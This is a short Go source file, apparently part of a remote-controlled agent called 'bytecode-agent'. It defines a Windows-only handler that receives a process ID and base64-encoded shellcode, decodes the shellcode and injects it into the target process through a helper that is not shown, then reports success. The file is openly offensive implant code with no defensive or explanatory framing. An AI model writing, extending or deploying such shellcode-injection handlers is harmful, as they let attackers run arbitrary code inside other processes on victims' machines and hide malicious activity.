//go:build windows
package executor

import (
	"encoding/base64"
	"fmt"
	"bytecode-agent/internal/windows"
)

func handleInjection(payload interface{}) (string, error) {
	payloadMap, ok := toMap(payload)
	if !ok {
		return "", fmt.Errorf("invalid payload: expected object")
	}

	pidFloat, ok := payloadMap["pid"].(float64)
	if !ok {
		return "", fmt.Errorf("missing or invalid 'pid' in payload")
	}
	pid := uint32(pidFloat)

	shellcodeB64, ok := payloadMap["shellcode"].(string)
	if !ok {
		return "", fmt.Errorf("missing or invalid 'shellcode' (base64) in payload")
	}

	shellcode, err := base64.StdEncoding.DecodeString(shellcodeB64)
	if err != nil {
		return "", fmt.Errorf("failed to decode shellcode: %v", err)
	}

	err = windows.InjectShellcode(pid, shellcode)
	if err != nil {
		return "", fmt.Errorf("injection failed: %v", err)
	}

	return fmt.Sprintf("Successfully injected shellcode into PID %d", pid), nil
}
